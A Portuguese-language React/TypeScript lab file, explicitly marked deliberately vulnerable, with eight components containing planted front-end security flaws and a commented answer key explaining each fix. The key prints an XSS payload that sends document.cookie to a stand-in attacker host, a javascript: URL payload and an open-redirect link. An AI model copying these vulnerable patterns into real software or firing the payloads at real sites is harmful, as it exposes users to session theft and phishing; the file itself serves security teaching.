/**
 * =========================================================================
 *   ⚠️  CÓDIGO DELIBERADAMENTE VULNERÁVEL — MATERIAL DIDÁTICO (M13)  ⚠️
 * =========================================================================
 *
 * NÃO USE NADA DESTE ARQUIVO EM PRODUÇÃO.
 *
 * Parte 2 do laboratório de segurança (a parte 1 é `vulneravel.py`).
 * Oito casos com vulnerabilidades típicas de SPA. Para cada um, em duplas:
 *
 *   1. identificar a vulnerabilidade (e nomeá-la);
 *   2. demonstrar a exploração com payload concreto, no SEU ambiente local;
 *   3. corrigir;
 *   4. explicar por que a correção funciona.
 *
 * Gabarito comentado no fim do arquivo. Não leia antes de tentar.
 *
 * Regra da disciplina: exploração apenas contra o seu ambiente local ou
 * contra sistemas para os quais você tem autorização explícita por escrito.
 */

import { useEffect, useState } from "react";
import { useNavigate, useSearchParams } from "react-router";

import { api } from "./api/client";
import type { Obra, Usuario } from "./api/tipos";

// --------------------------------------------------------------------- 1
export function SinopseObra({ obra }: { obra: Obra }) {
  return (
    <div className="prose">
      <h2>{obra.titulo}</h2>
      <div dangerouslySetInnerHTML={{ __html: obra.sinopse }} />
    </div>
  );
}

// --------------------------------------------------------------------- 2
export function LinkExterno({ obra }: { obra: Obra }) {
  return (
    <a href={obra.link_externo} target="_blank">
      Saiba mais sobre {obra.titulo}
    </a>
  );
}

// --------------------------------------------------------------------- 3
const CHAVE_API_BUSCA = import.meta.env.VITE_GOOGLE_BOOKS_SECRET;

export async function buscarCapa(isbn: string) {
  const r = await fetch(
    `https://www.googleapis.com/books/v1/volumes?q=isbn:${isbn}&key=${CHAVE_API_BUSCA}`,
  );
  return r.json();
}

// --------------------------------------------------------------------- 4
export function PainelAdmin({ usuario }: { usuario: Usuario }) {
  if (usuario.papel !== "COORDENACAO") {
    return <p>Você não tem permissão para ver esta página.</p>;
  }
  return (
    <section>
      <h1>Relatórios financeiros</h1>
      <BotaoExportarTudo />
    </section>
  );
}

// --------------------------------------------------------------------- 5
export function FormularioPerfil({ usuario }: { usuario: Usuario }) {
  const [dados, setDados] = useState(usuario);

  async function salvar() {
    await api(`/usuarios/${usuario.id}/`, {
      method: "PATCH",
      body: JSON.stringify(dados),
    });
  }

  return (
    <form onSubmit={(e) => { e.preventDefault(); salvar(); }}>
      <input value={dados.nome} onChange={(e) => setDados({ ...dados, nome: e.target.value })} />
      <input type="hidden" name="papel" value={dados.papel} />
      <button type="submit">Salvar</button>
    </form>
  );
}

// --------------------------------------------------------------------- 6
export function Login() {
  const navegar = useNavigate();
  const [erro, setErro] = useState("");

  async function entrar(usuario: string, senha: string) {
    try {
      const resposta = await api<{ token: string; usuario: Usuario }>("/auth/login/", {
        method: "POST",
        body: JSON.stringify({ usuario, senha }),
      });
      localStorage.setItem("token", resposta.token);
      localStorage.setItem("usuario", JSON.stringify(resposta.usuario));
      navegar("/");
    } catch (e) {
      setErro(`Falha ao entrar: ${(e as Error).message}`);
    }
  }

  return <form>{/* ... */}</form>;
}

// --------------------------------------------------------------------- 7
export function RedirecionaAposLogin() {
  const [params] = useSearchParams();
  const navegar = useNavigate();

  useEffect(() => {
    const destino = params.get("next");
    if (destino) {
      window.location.href = destino;
    }
  }, [params, navegar]);

  return null;
}

// --------------------------------------------------------------------- 8
export function ListaAssociados() {
  const [associados, setAssociados] = useState<Usuario[]>([]);

  useEffect(() => {
    api<Usuario[]>("/associados/").then(setAssociados);
  }, []);

  return (
    <table>
      <tbody>
        {associados.map((a) => (
          <tr key={a.id}>
            <td>{a.nome}</td>
            <td>{a.email}</td>
            <td>{a.cpf}</td>
            <td>{a.telefone}</td>
            <td>{a.endereco}</td>
          </tr>
        ))}
      </tbody>
    </table>
  );
}

/* =====================================================================
 * GABARITO — não leia antes de tentar.
 * =====================================================================
 *
 *  1. A03 XSS armazenado. `dangerouslySetInnerHTML` com texto do usuário
 *     executa scripts. Payload: cadastre uma obra com sinopse
 *     `<img src=x onerror="fetch('https://atacante/'+document.cookie)">`.
 *     Note que `HttpOnly` protege o sessionid, mas o script ainda pode
 *     fazer requisições autenticadas em nome da vítima.
 *     Correção: renderizar como texto (`{obra.sinopse}` com
 *     `whitespace-pre-line`). Se HTML rico for requisito, sanitize na
 *     ESCRITA, no backend, com lista de permissões (nh3/bleach).
 *
 *  2. A03 XSS via URL + tabnabbing. `href` com valor do usuário aceita
 *     `javascript:alert(document.cookie)`. E `target="_blank"` sem
 *     `rel="noopener"` deixa a página aberta manipular `window.opener`.
 *     Correção: validar o esquema (só http/https) com `new URL()` e
 *     acrescentar `rel="noopener noreferrer"`.
 *
 *  3. A02 Segredo exposto no bundle. Toda variável `VITE_*` é substituída
 *     em tempo de build e vai para o JavaScript público.
 *     Prove: `pnpm build && grep -r "$CHAVE" dist/`.
 *     Correção: a chamada com chave secreta é feita pelo BACKEND; o
 *     frontend chama o backend. Chave que precisa ser secreta nunca
 *     passa pelo frontend.
 *
 *  4. A01 Autorização só no cliente. O componente esconde a tela, mas o
 *     endpoint continua aberto: `curl -b cookies.txt /api/relatorios/`
 *     devolve os dados. Além disso, o código do painel está no bundle.
 *     Correção: `permission_classes` no DRF. O componente continua útil
 *     como UX, nunca como proteção.
 *
 *  5. A01 Mass assignment / escalada de privilégio. `dados` é o objeto
 *     inteiro do usuário, incluindo `papel`, enviado no PATCH. Campo
 *     `hidden` não protege nada — o cliente controla o corpo.
 *     Correção: enviar apenas os campos editáveis, E (o que realmente
 *     importa) declarar os campos no DTO de saída do backend.
 *
 *  6. A07 Token em localStorage + vazamento de dados. Qualquer XSS lê
 *     `localStorage.getItem("token")`. Guardar o objeto do usuário
 *     também expõe dados pessoais a qualquer script.
 *     Correção: sessão com cookie HttpOnly (ADR-07); o usuário atual vem
 *     de `GET /api/auth/eu/`, e o cache do Query é limpo no logout.
 *
 *  7. A01 Redirecionamento aberto (open redirect). `?next=https://phishing.com`
 *     leva a vítima para fora do site, com a aparência de ter vindo de um
 *     link legítimo do BiblioCom.
 *     Correção: aceitar apenas caminhos internos — rejeitar tudo que não
 *     comece com "/" ou que comece com "//", e usar `navegar(destino)`
 *     do React Router em vez de `window.location.href`.
 *
 *  8. LGPD + A01. A tela exibe CPF, telefone e endereço de todos os
 *     associados para qualquer pessoa que alcance a rota; e mesmo que a
 *     tela escondesse colunas, a API já devolveu tudo — visível na aba
 *     Network.
 *     Correção: minimizar no DTO DE SAÍDA (não devolver o que a tela não
 *     usa), exigir permissão no endpoint, e questionar se o CPF precisa
 *     existir no sistema (princípio da necessidade).
 */
